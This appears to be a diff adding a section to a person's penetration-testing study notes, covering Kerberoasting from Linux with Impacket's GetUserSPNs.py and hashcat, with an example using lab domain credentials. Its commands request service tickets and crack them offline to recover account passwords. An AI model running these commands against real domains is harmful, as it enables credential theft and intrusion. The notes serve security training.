@@ -1214,3 +1214,61 @@ Output:
 - BloodHound = **strategy & planning**
 
 This phase sets up **lateral movement and privilege escalation**.
+
+---
+
+## Kerberoasting (from Linux) 🐧
+
+### Concept (what you're actually doing)
+
+- Kerberoasting targets **accounts with SPNs** (service accounts).
+- Any domain user can request a **TGS (service ticket)** for an SPN.
+- The returned ticket (**TGS-REP**) is encrypted in a way that allows **offline cracking**.
+
+---
+
+## GetUserSPNs.py (Impacket) — main workflow
+
+### 1) Enumerate SPN accounts
+
+```bash
+GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USER>
+```
+
+### 2) Request TGS tickets for cracking (all SPNs)
+```bash
+GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USER> -request
+```
+
+### 3) Request TGS ticket for a specific SPN user
+```bash
+GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USER> -request-user <SPN_USER>
+```
+
+### 4) Save tickets to a file
+```bash
+GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USER> -request-user <SPN_USER> -outputfile <tgs_file>
+```
+Example:
+```bash
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/sqldev:database! -request-user SAPService -outputfile SAPService_tgs
+```
+
+---
+
+## Hashcat mode selection (minimal)
+
+### How to identify the correct hashcat mode
+
+Look at the prefix of the Kerberos hash:
+
+- `$krb5tgs$23$...` → etype 23 (RC4-HMAC) → `-m 13100`
+- `$krb5tgs$17$...` → etype 17 (AES128) → `-m 19600`
+- `$krb5tgs$18$...` → etype 18 (AES256) → `-m 19700`
+
+### Example (etype 23)
+
+```bash
+hashcat -m 13100 <tgs_file_or_hash> <wordlist>
+
+
